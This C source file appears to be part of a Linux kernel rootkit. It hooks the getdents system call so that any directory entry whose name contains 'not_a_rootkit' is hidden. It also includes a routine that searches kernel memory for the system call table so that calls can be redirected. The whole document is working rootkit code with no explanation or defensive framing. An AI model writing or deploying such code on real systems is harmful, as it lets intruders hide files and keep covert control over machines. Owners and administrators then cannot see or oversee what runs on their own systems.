
#include <hooking.h>

/* our new getdents function */
asmlinkage long sys_getdents_new(unsigned int fd, struct linux_dirent64 __user *dirent,
	unsigned int count) {

	/* run the original function, then remove any entries we want */
	long ret = sys_getdents_original(fd, dirent, count);
	if (ret <= 0) {
		return ret;
	}

	/* dirent struct holding the adjusted entries */
	struct linux_dirent64 *ret_dir = kmalloc(ret, GFP_KERNEL);
	if (ret_dir == NULL) {
		return ret;
	}

	/* dirent in kernel space to copy to */
	struct linux_dirent64 *k_dir = kmalloc(ret, GFP_KERNEL);
	if (k_dir == NULL) {
		kfree(ret_dir);
		return ret;
	}

	copy_from_user(k_dir, dirent, ret);

	long new_len = 0;					/* adjusted length reported back */
	struct linux_dirent64 *ref_dir;		/* entry being examined */
	int offset = 0;						/* offset into entries */

	while (offset < ret) {
		unsigned char *cur_ref = (unsigned char *)k_dir + offset;
		ref_dir = (struct linux_dirent64 *)cur_ref;

		if (strstr(ref_dir->d_name, "not_a_rootkit") == NULL) {			
			/* valid dirent, append it */
			memcpy((void *)ret_dir+new_len, ref_dir, ref_dir->d_reclen);
			new_len += ref_dir->d_reclen;
		}	/* else the entry contains the forbidden text, ignore it */

		offset += ref_dir->d_reclen;
	}
	/* copy over the original dirent */
	copy_to_user(dirent, ret_dir, new_len);
	kfree(k_dir);
	kfree(ret_dir);

	return new_len;
}

#define START_SEARCH PAGE_OFFSET
#define END_SEARCH ULONG_MAX
unsigned long *find_syscall_table (void) {
	unsigned long i;
	unsigned long *syscall_table;
	unsigned long sys_open_addr = kallsyms_lookup_name("sys_open");
	for (i = START_SEARCH; i < END_SEARCH; i+= sizeof(void *)) {
		syscall_table = (unsigned long *)i;

		if (syscall_table[__NR_open] == (unsigned long)sys_open_addr) {
			return syscall_table;
		}
	}
	return NULL;
}